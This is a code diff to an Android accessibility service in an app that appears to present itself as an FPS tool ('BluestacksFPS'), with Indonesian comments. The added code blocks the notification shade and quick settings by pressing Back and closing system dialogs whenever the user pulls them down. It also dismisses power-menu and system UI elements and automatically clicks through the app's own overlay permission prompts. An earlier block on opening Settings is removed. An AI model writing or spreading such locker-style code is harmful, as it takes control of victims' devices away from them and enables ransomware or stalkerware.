@@ -44,56 +44,36 @@ public class FPSAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        int eventType = event.getEventType();
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-    
-        // 1. BLOKIR STATUS BAR & QUICK SETTINGS
+
+        // 1. BLOKIR QUICK SETTINGS & NOTIFIKASI
+        // Setiap kali user menarik status bar, packageName biasanya berubah menjadi systemui
         if (packageName.equals("com.android.systemui")) {
+            // Tekan BACK secara virtual untuk menutup panel yang sedang meluncur turun
             performGlobalAction(GLOBAL_ACTION_BACK);
+
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                 performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
             }
-            return;
+            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
+            sendBroadcast(closeDialog);
+            
+            writeLog("Quick Settings/Notification blocked.");
         }
-    
-        // 2. PROTEKSI PENGATURAN (SETTINGS)
-        // Jika user masuk ke settings dan kita SUDAH terautentikasi atau 
-        // izin sudah lengkap, maka blokir akses ke Settings.
-        if (packageName.equals("com.android.settings")) {
-            if (!isSpecificPermissionPage(event)) { 
-                writeLog("Blocking Settings access - Force returning to App");
-                forceOpenApp(); // Memaksa kembali ke MainActivity/Overlay
-                return;
-            }
-        }
-    
+
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         if (rootNode == null) return;
-    
+
         try {
-            // Blokir menu power
-            if (packageName.equals("android")) {
+            if (packageName.equals("android") || packageName.contains("systemui")) {
                 checkAndDismissSensitiveUI(rootNode);
             }
-            
-            // Alur otomatisasi klik izin (Hanya jalankan jika belum aktif)
             handleOverlayPermissionFlow(rootNode, packageName);
+            
         } finally {
             rootNode.recycle();
         }
-    }
-    
-    // Helper untuk mengecek apakah user sedang di halaman izin yang "dibolehkan"
-    private boolean isSpecificPermissionPage(AccessibilityEvent event) {
-        // Biarkan user di settings HANYA jika teksnya mengandung nama aplikasi kita
-        // Ini agar proses auto-klik tetap jalan, tapi user tidak bisa browsing menu lain.
-        AccessibilityNodeInfo node = getRootInActiveWindow();
-        if (node != null) {
-            List<AccessibilityNodeInfo> list = node.findAccessibilityNodeInfosByText("BluestacksFPS");
-            boolean isSafe = !list.isEmpty();
-            node.recycle();
-            return isSafe;
-        }
-        return false;
     }
 
     private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
